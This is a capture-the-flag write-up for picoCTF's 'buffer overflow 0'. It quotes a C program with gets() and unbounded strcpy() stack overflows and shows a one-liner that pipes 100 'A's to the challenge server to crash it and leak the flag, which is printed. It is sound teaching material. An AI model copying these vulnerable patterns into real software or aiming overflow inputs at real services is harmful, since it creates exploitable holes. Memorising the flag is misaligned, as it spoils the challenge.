# buffer overflow 0

**Category:** Binary Exploitation
**Platform:** CyLab/picoCTF
**Difficulty:** Easy

## Description

A vulnerable C program with a classic stack buffer overflow. Crashing it correctly causes a signal handler to print the flag.

## Solution

### Step 1: Read the source

```bash
cat vuln.c
```

Key code:

```c
char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  ...
  signal(SIGSEGV, sigsegv_handler);
  ...
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  ...
}
```

Two vulnerabilities stack together:
- `gets(buf1)` has no bounds checking, so any length of input is accepted.
- `strcpy(buf2, input)` copies that input into a fixed 16-byte buffer `buf2` with no size limit — a classic stack buffer overflow.

Crucially, the program registers a `SIGSEGV` handler that **prints the flag** whenever the program crashes with a segmentation fault. So deliberately overflowing the buffer to trigger a crash is the intended solve path — no need to control return addresses or do anything fancy.

### Step 2: Trigger the overflow

Locally, tried running the compiled binary directly:

```bash
chmod +x vuln
python3 -c "print('A'*100)" | ./vuln
```

This just printed a message about needing a local `flag.txt` — the real target is the remote instance, not the local binary.

### Step 3: Connect to the remote challenge instance

Connected to the provided server/port and sent an oversized input (100 `A`s, well past the 16-byte buffer) to trigger the overflow and the resulting segfault:

```bash
python3 -c "print('A'*100)" | nc saturn.picoctf.net 58803
```

The crash triggered `sigsegv_handler`, which printed the flag.

## Flag

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Takeaway

`gets()` and unbounded `strcpy()` are classic sources of stack buffer overflows — any input longer than the destination buffer corrupts adjacent stack memory. Here the crash itself was the win condition: a `SIGSEGV` handler that dumps sensitive data (the flag) on crash turns a simple overflow into an easy info leak, no shellcode or ROP needed.
